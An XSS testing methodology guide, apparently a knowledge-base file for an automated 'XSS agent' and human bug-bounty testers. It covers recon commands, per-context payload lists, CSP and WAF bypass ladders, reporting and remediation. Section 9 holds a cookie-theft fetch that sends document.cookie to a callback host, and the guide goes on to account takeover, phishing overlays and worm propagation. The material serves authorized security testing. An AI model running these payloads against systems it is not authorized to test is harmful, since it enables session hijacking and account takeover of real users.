# 38 - Complete XSS Testing Methodology

## Overview

This document compiles the complete XSS testing methodology into a single actionable reference. It provides pre-engagement checklists, time-boxed approaches, per-context testing procedures, CSP and WAF bypass checklists, impact demonstration guides, report writing guidance with CVSS scoring, and bug-bounty-specific methodology. This is the definitive methodology reference for the XSS agent and human testers alike.

**Cross-references**: Detailed methodology in `39-agent-methodology.md`, decision logic in `40-agent-decision-logic.md`, tools in `34-xss-tools.md`, Burp integration in `36-burp-integration.md`, payloads in `22-exploitation-payloads.md`, polyglots in `37-xss-polyglots.md`.

**Sources:**
- https://portswigger.net/web-security/cross-site-scripting
- https://owasp.org/www-community/attacks/xss/
- https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
- https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-reflected-xss-vulnerabilities
- https://www.bugbountyhunter.com/vulnerability/?type=xss
- https://www.hacker101.com/resources/articles/writing_a_report_and_cvss.html
- https://www.pentesting.org/bugbounty-report-guide/
- https://github.com/amrelsagaei/Bug-Bounty-Hunting-Methodology-2025
- https://hackthedome.com/bug-bounty-hunting-process/

---

## 1. Pre-Engagement Checklist

Complete these items before sending a single payload:

```
[ ] 1. Scope confirmation
    [ ] Target URLs and domains confirmed
    [ ] In-scope vs out-of-scope boundaries documented
    [ ] Rules of engagement reviewed (especially for stored XSS / worms)
    [ ] Testing window confirmed

[ ] 2. Technology profiling
    [ ] Framework detected (React, Angular, Vue, jQuery, WordPress, etc.)
    [ ] Server technology identified (Apache, Nginx, IIS, Node.js, etc.)
    [ ] WAF detected and vendor identified (wafw00f, response headers)
    [ ] CDN identified (Cloudflare, Akamai, AWS CloudFront)
    [ ] CMS version noted (WordPress plugins are XSS goldmines)

[ ] 3. CSP analysis
    [ ] CSP header retrieved: curl -sI https://target.com | grep -i content-security-policy
    [ ] CSP evaluated: https://csp-evaluator.withgoogle.com/
    [ ] Report-Only vs enforced determined
    [ ] unsafe-inline / unsafe-eval / data: presence noted
    [ ] Whitelisted domains cataloged for JSONP/gadget analysis

[ ] 4. Authentication setup
    [ ] Test accounts created (or provided)
    [ ] Session tokens obtained from auth-agent
    [ ] Cookie flags documented (HttpOnly, Secure, SameSite)
    [ ] CSRF token mechanism identified
    [ ] Burp session handling rules configured

[ ] 5. Tool preparation
    [ ] Burp Suite configured with XSS extensions (DOM Invader, Reflect, ParamMiner)
    [ ] Collaborator client ready for blind XSS
    [ ] Dalfox / XSStrike installed
    [ ] Payload lists loaded
    [ ] Callback server ready (XSS Hunter, interactsh, or custom)
```

---

## 2. Comprehensive Testing Workflow

### Phase 1: Reconnaissance (15% of time)

```bash
# 1.1 Technology fingerprinting
wappalyzer https://target.com --pretty
curl -sI https://target.com | grep -iE "x-powered-by|server|x-aspnet|x-drupal"

# 1.2 WAF detection
wafw00f https://target.com
curl -s "https://target.com/?q=<script>" -o /dev/null -w "%{http_code}"

# 1.3 CSP retrieval
curl -sI https://target.com | grep -i "content-security-policy"

# 1.4 Parameter discovery
paramspider -d target.com --output params.txt
gau target.com --threads 5 --o gau_urls.txt
katana -u https://target.com -d 5 -jc -kf -o crawled.txt
cat params.txt gau_urls.txt crawled.txt | sort -u | uro > unique_urls.txt
arjun -i unique_urls.txt -m GET -oT hidden_params.txt

# 1.5 JavaScript analysis for DOM sources
katana -u https://target.com -jc -d 3 -ef woff,css,png | grep "\.js$" > js_files.txt
```

### Phase 2: Input Discovery and Mapping (15% of time)

```bash
# 2.1 Reflection analysis
cat unique_urls.txt | kxss | tee reflections.txt
cat unique_urls.txt | Gxss -p 'v0rt3x"<>'"'"'`{}()' | tee gxss_results.txt

# 2.2 Filter for high-value reflections
grep -E "Unfiltered.*[<>]" reflections.txt > high_value.txt

# 2.3 File upload point identification
# Manually browse: profile pictures, document uploads, import features

# 2.4 WebSocket endpoint discovery
# Check JS source for: new WebSocket, .onmessage, .send(
```

**Input Point Priority Matrix**:

| Priority | Input Type | Rationale |
|----------|-----------|-----------|
| P0 | Reflected in HTML body (unencoded) | Direct injection, highest success |
| P1 | Reflected in HTML attribute | Attribute breakout likely |
| P1 | Stored in user-visible content | Persistent XSS potential |
| P2 | Reflected in JavaScript context | String breakout needed |
| P2 | Used in client-side DOM manipulation | DOM XSS source |
| P3 | File upload with restrictions | Bypass required |
| P4 | Consumed by admin/internal tools | Blind XSS -- deploy canary |

### Phase 3: Context Analysis (10% of time)

For each reflection point, determine the exact context:

```
Submit canary: xss<>"'`(){}; 

Analyze response:
  1. Where does canary appear? (HTML body, attribute, JS, URL, comment)
  2. Which characters survived unencoded?
  3. Is rendering server-side or client-side?
  4. How many reflection points exist?
```

**Context Classification**:

| Context | Indicator | Primary Strategy |
|---------|-----------|-----------------|
| HTML body | Canary between tags | Inject new tag: `<svg onload=alert(1)>` |
| HTML attribute | Canary inside `value="..."` | Break out: `" onfocus=alert(1) autofocus` |
| URL attribute | Canary in `href="..."` | Protocol: `javascript:alert(1)` |
| JS string | Canary in `var x = "..."` | Close string: `";alert(1)//` |
| JS template literal | Canary in backtick string | Expression: `${alert(1)}` |
| HTML comment | Canary in `<!-- -->` | Close: `--><svg onload=alert(1)>` |
| DOM only | Canary in DOM, not source | DOM XSS: trace source to sink |
| Not reflected | Canary absent | Stored/blind XSS candidate |

### Phase 4: Payload Engineering and Testing (30% of time)

This is the core testing phase. For each context, deploy appropriate payloads:

**Initial payload per context** (use polyglot `'"><svg onload=alert(1)>` if context is unknown):

```
HTML body:      <img src=x onerror=alert(1)>
Attribute:      " onfocus=alert(1) autofocus "
JS string:      ";alert(1);//
URL attribute:  javascript:alert(1)
Comment:        --><svg onload=alert(1)>
Template:       {{constructor.constructor('alert(1)')()}}
```

**If initial payload is blocked, iterate through bypass ladder**:

```
Step 1: Try alternative tags/events
  <svg onload=alert(1)>  -->  <details open ontoggle=alert(1)>
  onerror                -->  onfocus, ontoggle, onpointerover

Step 2: Try alternative functions
  alert(1)               -->  confirm(1), prompt(1), print()

Step 3: Try encoding
  alert(1)               -->  &#97;lert(1)
  <script>               -->  %3Cscript%3E

Step 4: Try obfuscation
  alert                  -->  window['al'+'ert'](1)
  alert(1)               -->  alert`1`

Step 5: Try uncommon tags/events (brute-force via PortSwigger cheat sheet)
  <xmp>, <listing>, <math><mi>, <svg><animate>

Step 6: Try WAF-specific bypasses (see KB file 17)

Step 7: Try polyglots (see KB file 37)

Step 8: Try CSP bypass techniques (see KB files 12-14)
```

### Phase 5: Exploitation and Impact Demonstration (20% of time)

Once XSS is confirmed, escalate from alert(1) to demonstrate real impact:

| Session Characteristic | Exploitation Payload | Impact |
|-----------------------|---------------------|--------|
| Non-HttpOnly cookies | Cookie theft via `document.cookie` | Critical: Session hijacking |
| HttpOnly cookies, JS tokens | Extract from localStorage/sessionStorage | Critical: Token theft |
| HttpOnly cookies, no JS tokens | Perform authenticated actions (password change) | High: CSRF via XSS |
| Admin panel XSS | Create admin account or change admin password | Critical: Full ATO |
| Public stored XSS | Demonstrate worm propagation potential | Critical: Mass impact |

**Impact demonstration payloads**: See KB file `22-exploitation-payloads.md`.

### Phase 6: Report Generation (10% of time)

See Section 10 of this document for the complete reporting guide.

---

## 3. Testing Priority Matrix

When multiple vectors exist, test in this order based on maximum impact for minimum time:

| Rank | Vector | Why First | Expected Time |
|------|--------|-----------|---------------|
| 1 | URL parameters with HTML body reflection | Fastest to test, highest success rate | 5 min/param |
| 2 | Stored user content (comments, profiles) | High impact if successful | 10 min/field |
| 3 | Search functionality | Almost always reflects input | 5 min |
| 4 | Error messages | Often reflect input unsanitized | 5 min/error |
| 5 | URL fragment (hash) for DOM XSS | Common in SPAs | 15 min |
| 6 | File upload filenames/metadata | Often overlooked | 10 min |
| 7 | HTTP headers (Referer, UA) for blind XSS | Deploy and wait | 2 min to deploy |
| 8 | JSON API parameters | Rare but high value | 10 min/endpoint |
| 9 | WebSocket messages | Uncommon but impactful | 15 min |
| 10 | postMessage handlers | SPA-specific DOM XSS | 15 min |

---

## 4. Time-Boxed Testing Approaches

### 4.1 Quick Assessment (30 Minutes)

```
[ ] 5 min: Technology profiling + CSP check + WAF detection
[ ] 5 min: Submit polyglot A-01 ('"><svg onload=alert(1)>) to all visible URL parameters
[ ] 5 min: Check search functionality for reflection
[ ] 5 min: Test all form fields with canary string
[ ] 5 min: Deploy blind XSS payloads to contact/feedback forms
[ ] 5 min: Review results, confirm any findings
```

**Expected output**: 0-3 reflected XSS findings, blind XSS canaries deployed.

### 4.2 Standard Assessment (1 Hour)

```
[ ] 10 min: Full recon (tech stack, CSP, WAF, parameter discovery)
[ ] 10 min: Reflection analysis with kxss + Gxss
[ ] 15 min: Test all reflected parameters with context-appropriate payloads
[ ] 10 min: Test stored XSS in user content fields
[ ] 5 min: Deploy blind XSS canaries to all admin-consumed inputs
[ ] 5 min: Enable DOM Invader and browse SPA sections
[ ] 5 min: Report confirmed findings
```

### 4.3 Thorough Assessment (4 Hours)

```
[ ] 30 min: Full recon + parameter discovery + JS file analysis
[ ] 30 min: Automated scanning with Dalfox + Burp Scanner
[ ] 45 min: Manual testing of all reflected parameters with bypass iteration
[ ] 30 min: Stored XSS testing (profiles, comments, messaging)
[ ] 30 min: DOM XSS testing with DOM Invader (source-to-sink analysis)
[ ] 15 min: File upload XSS testing (SVG, HTML, filename injection)
[ ] 15 min: Blind XSS deployment to all possible admin-facing inputs
[ ] 15 min: CSP bypass testing (if CSP blocks execution)
[ ] 15 min: WAF bypass engineering (if WAF detected)
[ ] 15 min: Exploitation of confirmed findings (impact demonstration)
```

### 4.4 Full-Day Assessment (8 Hours)

```
Hour 1: Complete reconnaissance and input mapping
Hour 2: Automated scanning (Dalfox, Burp Scanner, XSStrike)
Hour 3: Manual reflected XSS testing with full bypass iteration
Hour 4: Stored XSS testing across all user content surfaces
Hour 5: DOM XSS analysis (JS bundle review, source-to-sink tracing)
Hour 6: Exotic vectors (file upload, JSON, headers, WebSocket, postMessage)
Hour 7: CSP bypass engineering + WAF bypass engineering
Hour 8: Exploitation, impact demonstration, and report writing
```

---

## 5. Automated + Manual Hybrid Methodology

### Phase A: Automated Discovery (Run in Background)

```bash
# Start these and let them run while you test manually:

# Dalfox automated scan
cat unique_urls.txt | dalfox pipe --deep-domxss --blind "YOUR.xss.ht" \
  -w 30 -o dalfox_results.json --format json &

# Burp Scanner active scan on scope (configure in Burp GUI)

# Nuclei XSS templates
nuclei -l unique_urls.txt -t xss/ -o nuclei_xss.txt &
```

### Phase B: Manual Testing (While Automation Runs)

```
1. Start with highest-priority reflection points from kxss output
2. Test each manually in Burp Repeater
3. Focus on areas automation struggles with:
   - Complex multi-step stored XSS
   - DOM XSS requiring browser interaction
   - Authentication-gated input surfaces
   - File upload XSS
   - postMessage handler vulnerabilities
```

### Phase C: Merge Results

```
1. Review Dalfox output for confirmed XSS
2. Review Burp Scanner findings
3. Cross-reference with manual findings
4. Eliminate duplicates
5. Verify all automated findings manually
6. Exploit confirmed findings for impact demonstration
```

---

## 6. Per-Context Testing Checklists

### 6.1 HTML Body Context

```
[ ] <img src=x onerror=alert(1)>
[ ] <svg onload=alert(1)>
[ ] <svg/onload=alert(1)>
[ ] <details open ontoggle=alert(1)>
[ ] <input autofocus onfocus=alert(1)>
[ ] <body onload=alert(1)>
[ ] <marquee onstart=alert(1)>
[ ] <video src=x onerror=alert(1)>
[ ] <audio src=x onerror=alert(1)>
[ ] <math><mi//onclick=alert(1)>click
[ ] <isindex type=image src=x onerror=alert(1)>
```

### 6.2 HTML Attribute Context

```
[ ] " onfocus=alert(1) autofocus "
[ ] " onmouseover=alert(1) "
[ ] " onclick=alert(1) "
[ ] "><img src=x onerror=alert(1)>
[ ] "><svg onload=alert(1)>
[ ] ' onfocus=alert(1) autofocus '
[ ] '><svg onload=alert(1)>
[ ] ` onfocus=alert(1) autofocus `  (IE only)
```

### 6.3 JavaScript String Context

```
[ ] ";alert(1);//
[ ] ';alert(1);//
[ ] \";alert(1);//  (if backslash escapes quotes)
[ ] \\";alert(1);//  (escape the escape)
[ ] </script><svg onload=alert(1)>
[ ] ${alert(1)}  (template literal)
[ ] "-alert(1)-"
[ ] '-alert(1)-'
```

### 6.4 URL Attribute Context

```
[ ] javascript:alert(1)
[ ] javascript:alert(document.domain)
[ ] data:text/html,<script>alert(1)</script>
[ ] &#106;avascript:alert(1)  (HTML entity bypass)
[ ] java%0ascript:alert(1)  (newline injection)
[ ] javascript:/**/alert(1)  (comment in protocol)
```

### 6.5 DOM XSS Testing

```
[ ] Enable DOM Invader with canary
[ ] Check location.hash sources
[ ] Check location.search sources  
[ ] Check document.referrer source
[ ] Check postMessage handlers
[ ] Check URL fragment routing (SPAs)
[ ] Trace source-to-sink flows in JS bundles
[ ] Test window.name as source
[ ] Check for prototype pollution gadgets
```

### 6.6 Stored XSS Testing

```
[ ] Test all user profile fields (name, bio, website, avatar URL)
[ ] Test comment/post content
[ ] Test messaging/chat content
[ ] Test file upload (SVG with XSS, HTML files, filename injection)
[ ] Test rich text / WYSIWYG editors (toggle to source mode)
[ ] Test import functionality (CSV injection, XML, JSON)
[ ] Test settings that display to other users
[ ] Check if admin sees different rendering of user content
```

### 6.7 Blind XSS Testing

```
[ ] Deploy to contact form (name, email, subject, message)
[ ] Deploy to support ticket system
[ ] Deploy to feedback/survey forms
[ ] Deploy via User-Agent header
[ ] Deploy via Referer header
[ ] Deploy via registration display name
[ ] Deploy via file upload filename
[ ] Deploy to error reporting mechanisms
[ ] Use XSS Hunter, Burp Collaborator, or interactsh for callback
```

---

## 7. CSP Bypass Testing Checklist

```
[ ] 1. Retrieve and parse CSP policy completely
[ ] 2. Check for Report-Only mode (no enforcement)
[ ] 3. Check for unsafe-inline in script-src
[ ] 4. Check for unsafe-eval in script-src
[ ] 5. Check for data: in script-src
[ ] 6. Check for wildcard (*) in script-src or default-src
[ ] 7. Enumerate all whitelisted domains in script-src
[ ] 8. Check each whitelisted domain for JSONP endpoints
       (use JSONBee database: https://github.com/nickysweet/JSONBee)
[ ] 9. Check whitelisted domains for Angular JS 1.x (sandbox bypass)
[ ] 10. Check if base-uri is restricted (if not, inject <base> tag)
[ ] 11. Check for nonce leakage in DOM, meta tags, or JS variables
[ ] 12. If strict-dynamic present, find script gadgets in nonced scripts
[ ] 13. Check if all pages have the same CSP (some may be weaker)
[ ] 14. Check subdomains for different/missing CSP
[ ] 15. Test CSP-compatible attacks:
        [ ] Dangling markup injection
        [ ] CSS exfiltration via attribute selectors
        [ ] Form action hijacking (if form-action unrestricted)
        [ ] DNS prefetch exfiltration
```

---

## 8. WAF Bypass Testing Checklist

```
[ ] 1. Identify WAF vendor (wafw00f, response headers, block page)
[ ] 2. Test if WAF blocks all tags or only specific ones
[ ] 3. Test if WAF blocks all events or only specific ones
[ ] 4. Enumerate allowed tags (brute-force tag names)
[ ] 5. For each allowed tag, enumerate allowed event handlers
[ ] 6. Test encoding bypasses:
       [ ] HTML entity encoding in attributes
       [ ] URL encoding
       [ ] Double URL encoding
       [ ] Unicode normalization (fullwidth characters)
       [ ] Mixed case: <ScRiPt>, <ImG>
[ ] 7. Test structural bypasses:
       [ ] Null bytes: <scr%00ipt>
       [ ] Tab/newline in tag: <svg%09onload=alert(1)>
       [ ] Comment insertion: <scr<!---->ipt>
       [ ] Slash separator: <svg/onload=alert(1)>
[ ] 8. Test function name bypasses:
       [ ] confirm(1) instead of alert(1)
       [ ] prompt(1) instead of alert(1)
       [ ] window['al'+'ert'](1) string concatenation
       [ ] alert`1` template literal syntax
       [ ] [].constructor.constructor('alert(1)')() constructor chain
[ ] 9. Test request-level bypasses:
       [ ] POST instead of GET
       [ ] Content-Type: multipart/form-data
       [ ] Chunked Transfer-Encoding
       [ ] HTTP/2 specific bypasses
       [ ] Adding custom headers (X-Forwarded-For: 127.0.0.1)
[ ] 10. Test IP-based bypasses:
        [ ] Find origin IP behind CDN/WAF
        [ ] Direct connection to origin IP
```

---

## 9. Impact Demonstration Checklist

After confirming XSS, demonstrate maximum impact:

```
[ ] 1. Determine session management model
       [ ] Check if cookies are HttpOnly
       [ ] Check for JS-accessible tokens (localStorage, sessionStorage)
       [ ] Check for CSRF tokens and their location

[ ] 2. Cookie theft (if non-HttpOnly)
       Payload: fetch('https://callback/steal',{method:'POST',mode:'no-cors',body:document.cookie})
       CVSS Impact: C:H (session hijacking)

[ ] 3. Token theft (if JS-accessible)
       Payload: Extract from localStorage/sessionStorage
       CVSS Impact: C:H (account takeover)

[ ] 4. Account takeover demonstration
       [ ] Password change via CSRF
       [ ] Email change + password reset
       [ ] Admin account creation (if admin context)
       CVSS Impact: C:H/I:H (full ATO)

[ ] 5. Data exfiltration
       [ ] Sensitive page content scraping
       [ ] Internal API data access
       CVSS Impact: C:H

[ ] 6. Phishing overlay
       [ ] Credential harvesting login form
       CVSS Impact: C:H

[ ] 7. Stored XSS specific
       [ ] Demonstrate worm propagation potential (describe, do not execute)
       [ ] Count affected users/pages
       CVSS Impact: Scale multiplier

[ ] 8. Electron/WebView specific
       [ ] Check for nodeIntegration / contextIsolation
       [ ] Demonstrate RCE if applicable
       CVSS Impact: C:H/I:H/A:H
```

---

## 10. Report Writing Guide

### 10.1 Report Template

```
TITLE: [Reflected/Stored/DOM] Cross-Site Scripting in [Component/Parameter]

SEVERITY: [Critical/High/Medium/Low] (CVSS Score: X.X)

VULNERABILITY TYPE: CWE-79 (Improper Neutralization of Input During Web Page Generation)

AFFECTED URL(S):
  https://target.com/search?q=[PAYLOAD]

DESCRIPTION:
  [2-3 sentences explaining the vulnerability, the injection context,
   and why it is exploitable. Mention the specific parameter and context.]

STEPS TO REPRODUCE:
  1. Navigate to https://target.com/search
  2. Enter the following payload in the search field: [EXACT PAYLOAD]
  3. Submit the form / Click search
  4. Observe that JavaScript executes (alert box appears / callback received)

PROOF OF CONCEPT:
  Payload: [EXACT PAYLOAD]
  URL: [FULL URL WITH PAYLOAD]
  Screenshot: [ATTACHED]

IMPACT:
  [Describe what an attacker can achieve:
   - Session hijacking via cookie theft
   - Account takeover via password change
   - Credential theft via phishing overlay
   - Data exfiltration
   - Mass user impact (if stored)]

CVSS v3.1 SCORE:
  [VECTOR STRING]
  Base Score: X.X

REMEDIATION:
  1. [Context-specific encoding recommendation]
  2. [CSP recommendation]
  3. [Input validation recommendation]

REFERENCES:
  - https://owasp.org/www-community/attacks/xss/
  - https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
```

### 10.2 CVSS v3.1 Scoring for XSS

**Reflected XSS (standard)**:
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N = 6.1 (Medium)
```

**Reflected XSS with ATO impact**:
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N = 9.3 (Critical)
```

**Stored XSS (standard)**:
```
CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N = 5.4 (Medium)
```

**Stored XSS with admin ATO**:
```
CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H = 9.0 (Critical)
```

**Stored XSS (unauthenticated)**:
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N = 9.3 (Critical)
```

**DOM XSS**: Score same as reflected unless stored characteristics.

**Self-XSS (requires victim self-injection)**: Generally not accepted unless chained. If chained with CSRF or login CSRF:
```
CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N = 4.7 (Medium)
```

### 10.3 Severity by Impact Demonstration

| Impact Demonstrated | Typical CVSS | Bug Bounty Range |
|--------------------|-------------|------------------|
| alert(1) only, no CSP bypass | 6.1 Medium | $100-$500 |
| Cookie theft (non-HttpOnly) | 6.1-7.5 High | $500-$2,000 |
| Account takeover (password change) | 8.0-9.3 Critical | $2,000-$10,000 |
| Admin ATO via stored XSS | 9.0-10.0 Critical | $5,000-$50,000 |
| Stored XSS with worm potential | 9.0+ Critical | $10,000-$50,000+ |
| XSS to RCE (Electron/WebView) | 9.8-10.0 Critical | $15,000-$100,000 |

### 10.4 Context-Specific Remediation Recommendations

| Context | Fix |
|---------|-----|
| HTML body | HTML entity encode: `<` to `&lt;`, `>` to `&gt;`, `&` to `&amp;` |
| HTML attribute | Attribute encode + always quote attributes |
| JavaScript string | JS Unicode encode; avoid inline user data in scripts |
| URL attribute | URL encode + whitelist `http://` and `https://` protocols only |
| CSS context | CSS encode + avoid user input in style contexts |
| DOM manipulation | Use `textContent` instead of `innerHTML`; use safe DOM APIs |
| General | Implement nonce-based CSP; set HttpOnly + Secure cookie flags |

---

## 11. Common Mistakes and Pitfalls

### 11.1 Testing Mistakes

| Mistake | Consequence | Fix |
|---------|------------|-----|
| Testing only `<script>alert(1)</script>` | Miss all non-script XSS | Use polyglots and multiple tag/event combinations |
| Not checking CSP before testing | Waste time on payloads that CSP blocks | Always check CSP in Phase 1 |
| Ignoring JavaScript context | Miss JS string breakout XSS | Always analyze the exact reflection context |
| Not encoding payloads for URL parameters | Payload breaks during transmission | URL-encode special characters |
| Forgetting stored XSS in admin contexts | Miss high-impact blind XSS | Deploy blind XSS canaries to every admin-consumed input |
| Stopping at alert(1) | Low severity report, lower bounty | Always demonstrate real impact |
| Testing only GET parameters | Miss POST body, header, cookie injection | Test all input vectors |
| Not testing authenticated surfaces | Miss input surfaces behind login | Use auth-agent sessions |
| Ignoring client-side rendering | Miss DOM XSS in SPAs | Use DOM Invader for client-side analysis |
| Not verifying in real browser | Report false positives | Always verify with "Show response in browser" |

### 11.2 Reporting Mistakes

| Mistake | Fix |
|---------|-----|
| Vague description ("found XSS") | Provide exact URL, parameter, payload, and context |
| No reproduction steps | Write numbered steps anyone can follow |
| No impact explanation | Explicitly state what an attacker could achieve |
| Missing CVSS score | Include CVSS vector string and base score |
| alert(1) as only PoC | Demonstrate cookie theft, ATO, or other real impact |
| Missing remediation | Provide context-specific fix recommendations |
| Duplicate submission | Search existing reports before submitting |
| No screenshot/evidence | Always include screenshots of execution |

---

## 12. Bug Bounty Specific Methodology

### 12.1 Recon-Heavy Approach

Bug bounty differs from standard pentesting in that recon and automation at scale yield the highest ROI:

```bash
# Phase 1: Mass subdomain + URL discovery
subfinder -d target.com -o subs.txt
httpx -l subs.txt -o live_subs.txt
katana -list live_subs.txt -d 5 -jc -kf -o all_urls.txt
gau --subs target.com >> all_urls.txt
waybackurls target.com >> all_urls.txt
sort -u all_urls.txt | uro > final_urls.txt

# Phase 2: Mass reflection testing
cat final_urls.txt | kxss | tee reflections.txt
cat final_urls.txt | Gxss -p 'v0rt3x"<>'"'"'`{}()' | tee gxss.txt

# Phase 3: Automated XSS scanning on confirmed reflections
grep -E "Unfiltered.*[<>]" reflections.txt | dalfox pipe \
  --deep-domxss --blind "your.xss.ht" -w 30 -o results.json --format json

# Phase 4: Manual verification and exploitation
# Review results, verify in browser, escalate impact
```

### 12.2 Bug Bounty Prioritization

| Priority | Focus | Why |
|----------|-------|-----|
| 1 | Stored XSS on high-traffic pages | Highest impact + payout |
| 2 | Admin panel blind XSS | Critical ATO |
| 3 | Reflected XSS with easy ATO chain | Demonstrable critical impact |
| 4 | DOM XSS in SPAs | Often overlooked by other hunters |
| 5 | File upload XSS (SVG) | Commonly missed |
| 6 | Second-order stored XSS | Hard to find, rewarded well |

### 12.3 Automation Pipeline

```
                Subdomains          URLs              Reflections
                    |                 |                    |
              subfinder/amass --> katana/gau --> kxss/Gxss --> dalfox
                                                              |
                                                         Results
                                                              |
                                                    Manual Verification
                                                              |
                                                     Impact Escalation
                                                              |
                                                       Bug Report
```

### 12.4 Duplicate Avoidance

- Search existing public reports for the target program
- Test unique parameters and endpoints, not obvious ones (/?q=, /search)
- Focus on authenticated surfaces (most hunters test unauthenticated only)
- Test file upload and exotic injection contexts
- Look for DOM XSS in JavaScript frameworks
- Target recently added features (new code = new bugs)

---

## Key Takeaways

1. **Reconnaissance first**: Technology stack and CSP determine your entire payload strategy. Never skip recon.
2. **Context is everything**: The same input can land in different contexts on different endpoints. Always probe context first.
3. **Bypass is iterative**: Filter evasion is a ladder of escalating techniques. Systematically identify what is blocked and exploit the gaps.
4. **Impact wins bounties**: `alert(1)` is confirmation, not impact. Always demonstrate cookie theft, ATO, or data exfiltration.
5. **Blind XSS is always deployed**: Every engagement should include blind XSS canary deployment to admin-facing inputs.
6. **Time-box effectively**: Use the time-boxed approaches (Section 4) to match your testing depth to available time.
7. **Automate discovery, manually verify**: Let tools find reflections; manually confirm and exploit findings.
8. **Report quality matters**: A well-documented finding with clear reproduction steps and impact demonstration earns higher bounties and faster triage.
